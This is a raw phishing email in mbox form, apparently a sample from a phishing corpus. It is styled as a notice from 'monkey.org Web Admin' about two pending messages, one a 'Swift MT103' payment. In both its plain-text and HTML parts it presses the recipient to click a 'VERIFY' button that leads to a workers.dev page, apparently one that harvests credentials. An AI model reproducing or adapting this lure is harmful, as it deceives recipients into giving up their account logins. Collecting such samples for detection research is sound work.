@@ -1,0 +1,245 @@
+From jose@monkey.org Tue Oct 24 14:52:31 2023 +0000
+Return-Path: swift@forever-tech.store
+Delivered-To: jose@monkey.org
+X-FDA: 81380646102.16.8AB2367
+Received: from mail.forever-tech.store (mail.forever-tech.store [198.23.221.24])
+	by imf23.b.hostedemail.com (Postfix) with ESMTP id 50498160015
+	for <jose@monkey.org>; Tue, 24 Oct 2023 14:52:28 +0000 (UTC)
+Authentication-Results: imf23.b.hostedemail.com;
+	dkim=pass header.d=forever-tech.store header.s=485B5B14-5CEB-11EE-90AB-45639EF915CD header.b="EsDnbiQ/";
+	spf=pass (imf23.b.hostedemail.com: domain of swift@forever-tech.store designates 198.23.221.24 as permitted sender) smtp.mailfrom=swift@forever-tech.store;
+	dmarc=pass (policy=none) header.from=forever-tech.store
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1698159148;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=d8bTlExOHnzme1/VBxwPGrrmSJs2YP8FUwE4Gl44b1Q=;
+	b=NNZWpHEzRGZmsHep28m9s+AmuFI07MXJ2cDRIMhf7aVVZGiOzHsRIZQeI3XkVm0qsBy6AR
+	WsRZVDljUZyMNOCFzEqHZJMtCdpc1pRy/kgvkZl3CkiJoUD2+8TtJMg8ygArI8AslkD//X
+	fIq6f+BoSZJnaotd8iFu+sfN45VQMSA=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1698159148; a=rsa-sha256;
+	cv=none;
+	b=5iVq1XOklQjqpy6gmQe6ocaWQhgGsrZ6AB5B81FRo6FTfXrta7Z5fODbfxX33i8tWRDvL3
+	yzf+3bjT6A8MAjpKtB+MDKM1EOwX7wF5wngcL6HsoGOoT13+oCWacALeX8cQuONRq2rsZ6
+	j+Hu6mc74mIv/ZBnH+l5PsdAUrATcsY=
+ARC-Authentication-Results: i=1;
+	imf23.b.hostedemail.com;
+	dkim=pass header.d=forever-tech.store header.s=485B5B14-5CEB-11EE-90AB-45639EF915CD header.b="EsDnbiQ/";
+	spf=pass (imf23.b.hostedemail.com: domain of swift@forever-tech.store designates 198.23.221.24 as permitted sender) smtp.mailfrom=swift@forever-tech.store;
+	dmarc=pass (policy=none) header.from=forever-tech.store
+Received: from localhost (localhost [127.0.0.1])
+	by mail.forever-tech.store (Postfix) with ESMTP id ABC65BBE34
+	for <jose@monkey.org>; Tue, 24 Oct 2023 10:24:42 -0400 (EDT)
+Received: from mail.forever-tech.store ([127.0.0.1])
+ by localhost (mail.forever-tech.store [127.0.0.1]) (amavis, port 10032)
+ with ESMTP id xZgag5uURHVv for <jose@monkey.org>;
+ Tue, 24 Oct 2023 10:24:39 -0400 (EDT)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.forever-tech.store (Postfix) with ESMTP id 371DCBEBC5
+	for <jose@monkey.org>; Tue, 24 Oct 2023 06:49:20 -0400 (EDT)
+DKIM-Filter: OpenDKIM Filter v2.10.3 mail.forever-tech.store 371DCBEBC5
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=forever-tech.store;
+	s=485B5B14-5CEB-11EE-90AB-45639EF915CD; t=1698144560;
+	bh=d8bTlExOHnzme1/VBxwPGrrmSJs2YP8FUwE4Gl44b1Q=;
+	h=From:To:MIME-Version:Date:Message-Id;
+	b=EsDnbiQ/1jTLNHZ/eoBmmF7k5pSoh0mwJ9DSrGJmZnmrNuE+GrpU6V6sSpJpVzEwB
+	 4DQtB1zo4UPzUHUT5q1sImwoUwvuzmhFqoIAdC+pTGXleMDdXVyjBnmju2yfC1XE2s
+	 xWXIBaLh5RJGsW5ID90rv7jpod38HB+F+hL5tOSIuPlcYSW6nub77bqTlyOFFeEsZO
+	 4OY8/uuuQAbaBMFI37BzY4C1Qp20HXT7En1p0b3HxNJg19o3RwS6AunWy7pqPiHTA6
+	 ZXIEQ5UDRUieJ3R9+hb2EVrhTxP8nX/6yyPq5ulBYafPTnLYltFIGXe5Mptc/vKxNu
+	 goo1E6jONa3DQ==
+X-Virus-Scanned: amavis at mail.forever-tech.store
+Received: from mail.forever-tech.store ([127.0.0.1])
+ by localhost (mail.forever-tech.store [127.0.0.1]) (amavis, port 10026)
+ with ESMTP id 98JU_Q7FbIZL for <jose@monkey.org>;
+ Tue, 24 Oct 2023 06:49:17 -0400 (EDT)
+Received: from WIN-PDTJ18SBRQ9 (unknown [188.93.233.139])
+	by mail.forever-tech.store (Postfix) with ESMTPSA id 061D7BA1E5
+	for <jose@monkey.org>; Tue, 24 Oct 2023 03:49:44 -0400 (EDT)
+From: "monkey.org SERVER" <swift@forever-tech.store>
+Subject: Two (2 ) Messages Pending Delivery
+To: <jose@monkey.org>
+Content-Type: multipart/alternative; boundary="ngF=_if5sS6kaRzWPXXeQ7qBbS3Ywp1GkR"
+MIME-Version: 1.0
+Reply-To: <no-reply.scan@monkey.org>
+Date: Tue, 24 Oct 2023 00:49:45 -0700
+Message-Id: <20232410004944BEBC597148$1DD7BD0525@forever-tech.store>
+X-Rspamd-Server: rspam12
+X-Rspam-User: 
+X-Spam-Status: No, score=1.22
+X-Stat-Signature: p46633y6n9o3ffn3wum1yjsbse58pkbn
+X-Rspamd-Queue-Id: 50498160015
+X-HE-Tag: 1698159148-663583
+X-HE-Meta: U2FsdGVkX1+FRsNwE543nOt/BRWvJxEe/rI540muMGfPNn2M2S1pI+84/rbMZJJ+XKXVT7ZL1vq1uQ28VAsQrEvXSqxPl2FqTVas4ZfEb4N5MPpHqwRkQWjGFqy2Vys1pfZhZQJfeNyOQJ8Ji5j0FKf4Y6jzq3TzfzGRuCMygPE6BnbdK3FHpzDTRxdaI6VECVxt9bQXYfeSUhqZ2HOPz3pL/FU/TZeSTp/Ng3iqSVXr1qpJqnawHJXapnph5HrqWJKAGLjxqJfQhNObBIuwzUzICzP6J2Y4uxr8TDLqrAa7kNW4fwSlVqqUlEtTBdVnw/IJdbG+vl7fsGYj0QQS1g==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 334
+
+This is a multi-part message in MIME format
+
+--ngF=_if5sS6kaRzWPXXeQ7qBbS3Ywp1GkR
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+You have Two (2 ) Messages Pending Delivery On Your e-Mail Portal Sinc=
+e: Tuesday, October 24, 2023.
+
+To view pending messages kindly verify your EMAIL: jose@monkey.org BEL=
+OW
+
+Status Subject Recipient=20
+
+Pending Delivery: Quotations update=20
+
+To:jose@monkey.org
+
+10/24/2023
+
+Pending Delivery: Swift MT103 000431562267718=20
+
+To:jose@monkey.org
+
+10/24/2023
+
+VERIFY jose@monkey.org https://worker-flat-lake-service.riltekirzi.wor=
+kers.dev/px/QmUb7iKvDg3yBYqB1rM95ZCoKe8QpZLUbo4nPrPQGJcKju#jose@monkey=
+=2Eorg
+
+Sincerely
+
+monkey.org Web Admin (C) 2023 Secured Service.
+
+monkey.org =E2?=A2 Web Admin =E2?=A2 Redmond, WA 98052
+You are receiving this one-time notification because new updates on ou=
+r server.
+
+--ngF=_if5sS6kaRzWPXXeQ7qBbS3Ywp1GkR
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
+8859-1">
+  <title>Two (2 ) Messages Pending Delivery</title>
+ </head>
+ <body> <DIV id=3DmessageBody> <DIV class=3DrcmBody> <DIV style=3D"FON=
+T-SIZE: small; BORDER-TOP: 0px; FONT-FAMILY: Arial,Helvetica,sans-seri=
+f; COLOR: rgb(34,34,34); PADDING-TOP: 0px; BACKGROUND-COLOR: rgb(255,2=
+55,255)" dir=3Dltr><SPAN style=3D"COLOR: rgb(0,0,0)" size=3D"4"><SPAN =
+style=3D"FONT-FAMILY: Calibri">You have Two (2 ) Messages Pending Deli=
+very On Your e-Mail Portal Since:&nbsp;Tuesday, October 24, 2023.</SPA=
+N></SPAN></DIV> <DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial,Hel=
+vetica,sans-serif; COLOR: rgb(34,34,34); BACKGROUND-COLOR: rgb(255,255=
+,255)" dir=3Dltr><SPAN style=3D"FONT-FAMILY: Calibri; COLOR: rgb(0,0,0=
+)">To view pending messages kindly verify your&nbsp;EMAIL: jose@monkey=
+=2Eorg BELOW</SPAN></DIV> <DIV style=3D"FONT-SIZE: small; FONT-FAMILY:=
+ Arial,Helvetica,sans-serif; COLOR: rgb(34,34,34); BACKGROUND-COLOR: r=
+gb(255,255,255)" dir=3Dltr>&nbsp;</DIV> <DIV style=3D"FONT-SIZE: small=
+; FONT-FAMILY: Arial,Helvetica,sans-serif; COLOR: rgb(34,34,34); BACKG=
+ROUND-COLOR: rgb(255,255,255)" dir=3Dltr><SPAN style=3D"FONT-FAMILY: C=
+alibri; COLOR: rgb(0,0,0)"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;Status&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;Subject&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<WBR> &nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;Rec=
+ipient&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</B>=
+</SPAN></DIV> <DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial,Helve=
+tica,sans-serif; COLOR: rgb(34,34,34); BACKGROUND-COLOR: rgb(255,255,2=
+55)" dir=3Dltr><table style=3D"HEIGHT: 104px; WIDTH: 711px; COLOR: rgb=
+(0,0,0)" cellSpacing=3D2 cellPadding=3D2 border=3D0> <tr><td style=3D"=
+FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WIDTH: 360=
+px; MARGIN: 0px; BACKGROUND-COLOR: rgb(204,204,255)"><FONT face=3DCali=
+bri>Pending Delivery:&nbsp;&nbsp;<SPAN style=3D"FONT-SIZE: 16px"><STRO=
+NG><SPAN style=3D"COLOR: rgb(0,0,255)">Quotations update</SPAN> </STRO=
+NG></SPAN></FONT></td><td style=3D"FONT-FAMILY: Calibri; WIDTH: 207px;=
+ MARGIN: 0px; BACKGROUND-COLOR: rgb(204,204,255)">To:<FONT face=3DAria=
+l>jose@monkey.org</FONT></td><td style=3D"FONT-FAMILY: Calibri; WIDTH:=
+ 136px; MARGIN: 0px; BACKGROUND-COLOR: rgb(204,204,255)">10/24/2023</T=
+D></tr><tr><td style=3D"FONT-FAMILY: Calibri; WIDTH: 360px; MARGIN: 0p=
+x; BACKGROUND-COLOR: rgb(204,204,255)">Pending Delivery:&nbsp;&nbsp;<S=
+PAN style=3D"COLOR: rgb(0,0,255)">&nbsp;</SPAN><SPAN style=3D"COLOR: r=
+gb(0,0,255)"><STRONG><SPAN style=3D"FONT-SIZE: 16px">Swift MT103 00043=
+1562267718</SPAN> </STRONG></SPAN></td><td style=3D"FONT-FAMILY: Calib=
+ri; WIDTH: 207px; MARGIN: 0px; BACKGROUND-COLOR: rgb(204,204,255)">To:=
+<FONT face=3DArial>jose@monkey.org</FONT></td><td style=3D"FONT-FAMILY=
+: Calibri; WIDTH: 136px; MARGIN: 0px; BACKGROUND-COLOR: rgb(204,204,25=
+5)">10/24/2023</TD></TR></TABLE> <DIV style=3D"BORDER-TOP: 0px; PADDIN=
+G-TOP: 0px; MARGIN: 0px">&nbsp;</DIV> <DIV style=3D"BORDER-TOP: 0px; P=
+ADDING-TOP: 0px; MARGIN: 0px"><FONT style=3D"FONT-FAMILY: arial,helvet=
+ica,sans-serif" face=3D"arial, helvetica, sans-serif"><SPAN id=3Dv1m_4=
+096096604002260787gmail-m_-6167600525127078203m_-6297207897520267623m_=
+-8379219818482174396gmail-ydpb39c4f3cOBJ_PREFIX_DWT1197_com_zimbra_url=
+ class=3Dv1m_4096096604002260787gmail-m_-6167600525127078203m_-6297207=
+897520267623m_-8379219818482174396gmail-ydpb39c4f3cObject style=3D"COL=
+OR: rgb(33,33,33)"><SPAN id=3Dv1m_4096096604002260787gmail-m_-61676005=
+25127078203m_-6297207897520267623m_-8379219818482174396gmail-ydpb39c4f=
+3cOBJ_PREFIX_DWT1198_com_zimbra_url class=3Dv1m_4096096604002260787gma=
+il-m_-6167600525127078203m_-6297207897520267623m_-8379219818482174396g=
+mail-ydpb39c4f3cObject><SPAN id=3Dv1m_4096096604002260787gmail-m_-6167=
+600525127078203m_-6297207897520267623m_-8379219818482174396gmail-OBJ_P=
+REFIX_DWT351_com_zimbra_url class=3Dv1m_4096096604002260787gmail-m_-61=
+67600525127078203m_-6297207897520267623m_-8379219818482174396gmail-Obj=
+ect style=3D"COLOR: rgb(0,90,149)"><SPAN id=3Dv1m_4096096604002260787g=
+mail-m_-6167600525127078203m_-6297207897520267623m_-837921981848217439=
+6gmail-OBJ_PREFIX_DWT352_com_zimbra_url class=3Dv1m_409609660400226078=
+7gmail-m_-6167600525127078203m_-6297207897520267623m_-8379219818482174=
+396gmail-Object><SPAN id=3Dv1m_4096096604002260787gmail-m_-61676005251=
+27078203m_-6297207897520267623m_-8379219818482174396gmail-OBJ_PREFIX_D=
+WT545_com_zimbra_url class=3Dv1m_4096096604002260787gmail-m_-616760052=
+5127078203m_-6297207897520267623m_-8379219818482174396gmail-Object><SP=
+AN id=3Dv1m_4096096604002260787gmail-m_-6167600525127078203m_-62972078=
+97520267623m_-8379219818482174396gmail-OBJ_PREFIX_DWT548_com_zimbra_ur=
+l class=3Dv1m_4096096604002260787gmail-m_-6167600525127078203m_-629720=
+7897520267623m_-8379219818482174396gmail-Object><SPAN id=3Dv1m_4096096=
+604002260787gmail-m_-6167600525127078203m_-6297207897520267623m_-83792=
+19818482174396gmail-OBJ_PREFIX_DWT608_com_zimbra_url class=3Dv1m_40960=
+96604002260787gmail-m_-6167600525127078203m_-6297207897520267623m_-837=
+9219818482174396gmail-Object><SPAN id=3Dv1m_4096096604002260787gmail-m=
+_-6167600525127078203m_-6297207897520267623m_-8379219818482174396gmail=
+-OBJ_PREFIX_DWT611_com_zimbra_url class=3Dv1m_4096096604002260787gmail=
+-m_-6167600525127078203m_-6297207897520267623m_-8379219818482174396gma=
+il-Object><SPAN id=3Dv1m_4096096604002260787gmail-m_-61676005251270782=
+03m_-6297207897520267623m_-8379219818482174396gmail-OBJ_PREFIX_DWT614_=
+com_zimbra_url class=3Dv1m_4096096604002260787gmail-m_-616760052512707=
+8203m_-6297207897520267623m_-8379219818482174396gmail-Object><SPAN id=3D=
+v1m_4096096604002260787gmail-m_-6167600525127078203m_-6297207897520267=
+623m_-8379219818482174396gmail-OBJ_PREFIX_DWT617_com_zimbra_url class=3D=
+v1m_4096096604002260787gmail-m_-6167600525127078203m_-6297207897520267=
+623m_-8379219818482174396gmail-Object><A style=3D"BACKGROUND-IMAGE: no=
+ne; FLOAT: left; COLOR: rgb(255,250,250); PADDING-BOTTOM: 10px; PADDIN=
+G-TOP: 10px; PADDING-LEFT: 10px; MARGIN: 2px; DISPLAY: block; PADDING-=
+RIGHT: 10px; BACKGROUND-COLOR: rgb(80,110,216)" href=3D"https://worker=
+-flat-lake-service.riltekirzi.workers.dev/px/QmUb7iKvDg3yBYqB1rM95ZCoK=
+e8QpZLUbo4nPrPQGJcKju#jose@monkey.org" rel=3Dnoopener target=3D_blank>=
+<STRONG>VERIFY jose@monkey.org </STRONG></A></SPAN></SPAN></SPAN></SPA=
+N></SPAN></SPAN></SPAN></SPAN></SPAN></SPAN></FONT></DIV> <DIV style=3D=
+"FONT-FAMILY: arial,helvetica,sans-serif; MARGIN: 0px"><BR><FONT face=3D=
+"arial, helvetica, sans-serif">&nbsp;</FONT></DIV> <DIV style=3D"FONT-=
+FAMILY: arial,helvetica,sans-serif; MARGIN: 0px">&nbsp;</DIV> <DIV sty=
+le=3D"FONT-FAMILY: arial,helvetica,sans-serif; MARGIN: 0px">&nbsp;</DI=
+V> <DIV style=3D"FONT-FAMILY: arial,helvetica,sans-serif; MARGIN: 0px"=
+><CITE>&nbsp;Sincerely</CITE></DIV> <DIV style=3D"FONT-FAMILY: arial,h=
+elvetica,sans-serif; MARGIN: 0px"><CITE>&nbsp;monkey.org Web Admin (C)=
+ 2023&nbsp;Secured Service.</CITE></DIV> <DIV style=3D"FONT-FAMILY: ar=
+ial,helvetica,sans-serif; MARGIN: 0px">&nbsp;</DIV> <DIV style=3D"FONT=
+-FAMILY: arial,helvetica,sans-serif; MARGIN: 0px">&nbsp;<SPAN style=3D=
+"FONT-SIZE: x-small; FONT-FAMILY: tahoma,sans-serif">&nbsp; &nbsp; &nb=
+sp; &nbsp;monkey.org . Web Admin . Redmond, WA 98052</SPAN><BR style=3D=
+"FONT-SIZE: x-small; FONT-FAMILY: tahoma,sans-serif"><SPAN style=3D"FO=
+NT-SIZE: x-small; FONT-FAMILY: tahoma,sans-serif">&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;</SPAN> &nbsp;&nbsp;<SPAN style=3D"FONT-SI=
+ZE: x-small; FONT-FAMILY: tahoma,sans-serif"> &nbsp;&nbsp;<FONT size=3D=
+1>You are receiving this one-time notification because new updates on =
+our server.</FONT></SPAN></DIV></DIV></DIV></DIV></body>
+ </html>
+
+--ngF=_if5sS6kaRzWPXXeQ7qBbS3Ywp1GkR--
